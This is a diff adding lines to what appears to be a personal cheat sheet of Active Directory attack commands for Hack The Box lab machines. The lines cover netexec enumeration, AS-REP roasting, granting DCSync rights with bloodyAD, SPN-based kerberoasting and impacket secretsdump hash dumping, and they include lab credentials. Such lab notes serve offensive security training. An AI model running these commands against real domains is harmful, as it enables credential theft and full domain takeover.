@@ -852,6 +852,15 @@ netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  --users
 # list shares 
 netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --shares
 
+# Get Password Policy info
+netexec ldap dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --pass-pol
+
+# Get description info 
+netexec ldap dc01.fluffy.htb -u '' -p '' --query "(description=*)" description
+
+# AS-REP Roasting ( find account have “Do not require Kerberos preauthentication” , get ticket have NTLM hash to crack ) 
+netexec ldap dc01.fluffy.htb -u '' -p '' --asreproast output.txt
+
 # get number computer can create
 netexec ldap dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  -M maq
 
@@ -936,6 +945,9 @@ python3 autobloodyAD.py
 # adding the p.agila user to the Service Accounts group
 bloodyAD -u p.agila -p prometheusx-303 -d fluffy.htb --host dc01.fluffy.htb add groupMember 'service accounts' p.agila
 
+# adding dcsync permission to account p.agila ( can dump all hash in DC)  (p.agila need have permission  WriteDACL to fluffy.htb ) 
+bloodyAD -u p.agila -p prometheusx-303 -d fluffy.htb --host dc01.fluffy.htb add dcsync 'p.agila' 
+
 # adding a SPN to alfred to get kerberoas to have a hash  alfred  ( henry need have  WriteSPN to alfred )   ( or auth by kerberoas when NTLM dissable) 
 bloodyAD -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --host dc01.tombwatcher.htb set object alfred servicePrincipalName -v 'http/whatever'
 or
@@ -988,6 +1000,9 @@ impacket-getST -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator 'a
 # import file Administrator.ccache  to dump ntlm 
 KRB5CCNAME=Administrator.ccache impacket-secretsdump  -k -no-pass authority.htb/administrator@authority.authority.htb -just-dc-ntlm
 Metasploit
+
+# AS-REP Roasting with account svc-alfresco ( find account have “Do not require Kerberos preauthentication” , get ticket have NTLM hash to crack )  
+impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.129.95.210 -no-pass
 
 ```
 ## Metasploit
